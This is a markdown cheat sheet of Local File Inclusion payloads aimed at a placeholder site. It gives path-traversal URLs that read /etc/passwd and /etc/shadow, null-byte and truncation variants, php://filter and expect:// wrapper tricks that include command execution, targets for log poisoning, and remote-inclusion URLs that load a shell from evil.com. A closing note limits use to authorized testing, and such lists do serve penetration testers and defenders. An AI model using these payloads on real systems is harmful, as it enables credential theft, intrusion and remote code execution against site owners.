# Local File Inclusion (LFI) Payloads

Below is a collection of LFI (Local File Inclusion) payloads that can be used for testing and educational purposes. These payloads attempt to read sensitive files on a vulnerable system.

## Basic LFI Payloads

```
http://vulnerable-site.com/index.php?page=../../../etc/passwd
http://vulnerable-site.com/index.php?page=../../../../etc/passwd
http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd
http://vulnerable-site.com/index.php?page=..%2F..%2F..%2Fetc%2Fpasswd
```

## Null Byte Injection (for older PHP versions)

```
http://vulnerable-site.com/index.php?page=../../../etc/passwd%00
http://vulnerable-site.com/index.php?page=../../../etc/passwd%00.html
```

## Path Truncation (for long filenames)

```
http://vulnerable-site.com/index.php?page=../../../etc/passwd............[add more dots]
http://vulnerable-site.com/index.php?page=../../../etc/passwd/././././././.[repeat]
```

## PHP Wrapper Techniques

```
http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://vulnerable-site.com/index.php?page=php://filter/resource=etc/passwd
http://vulnerable-site.com/index.php?page=expect://ls
```

## Log File Poisoning

```
http://vulnerable-site.com/index.php?page=../../../var/log/apache2/access.log
http://vulnerable-site.com/index.php?page=../../../var/log/apache/error.log
http://vulnerable-site.com/index.php?page=../../../var/log/nginx/access.log
```

## Interesting Files to Read

### Linux Systems
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/auth.log
/var/log/syslog
```

### Windows Systems
```
../../boot.ini
../../windows/win.ini
../../windows/system32/drivers/etc/hosts
```

## RFI (Remote File Inclusion) Payloads

```
http://vulnerable-site.com/index.php?page=http://evil.com/shell.txt
http://vulnerable-site.com/index.php?page=\\evil.com\share\shell.txt
```

## Important Notes

- These payloads are for educational and authorized testing purposes only
- Unauthorized use against systems you don't own is illegal
- Always get proper authorization before testing
- Many modern systems have protections against LFI attacks
